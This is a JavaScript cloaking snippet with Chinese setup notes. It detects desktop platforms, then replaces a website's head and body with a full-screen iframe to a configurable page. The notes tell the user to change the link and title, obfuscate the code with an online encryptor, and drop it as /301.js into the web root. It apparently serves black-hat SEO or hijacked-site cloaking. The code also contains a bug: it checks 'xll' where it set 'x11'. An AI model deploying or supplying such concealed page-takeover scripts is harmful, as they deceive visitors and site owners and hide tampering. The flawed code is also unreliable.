var uOtFIS1 = {
    win: false,
    mac: false,
    xll: false
};
var RfR2 = navigator['platform'];
var jjVDDNcsO3 = navigator['userAgent']['toLowerCase']();
uOtFIS1['win'] = RfR2['indexOf']("Win") == 0;
uOtFIS1['mac'] = RfR2['indexOf']("Mac") == 0;
uOtFIS1['x11'] = (RfR2 == "X11") || (RfR2['indexOf']("Linux") == 0);
if (uOtFIS1['win'] || uOtFIS1['mac'] || uOtFIS1['xll']) {
    var VI4 = '/404.html';
    $("head")['html']('<meta charset="UTF-8"><meta name="referrer" content="no-referrer"><title>网站标题</title><style>body{position:static !important;}body *{ visibility:hidden;}</style> ');
    $("body")['empty']();
    $(window["document"])['ready'](function() {
        $("body")['html']('<iframe style="width:100%; height:100%;position:absolute;margin-left:0px;margin-top:0px;top:0%;left:0%;" id="mainFrame" src="' + VI4 + '" frameborder="0" scrolling="no"></iframe>')['show']();
        $("body *")['css']("visibility", "visible")
    })
}


修改/404.html为你显示的链接
网站标题修改为显示的标题
加密地址
https://www.jsjiami.com/charcode.html

 <script language="javascript" type="text/javascript" rel="nofollow noopener noreferrer" src="/301.js"></script>

保存位置网站根目录
/home/wwwroot/default
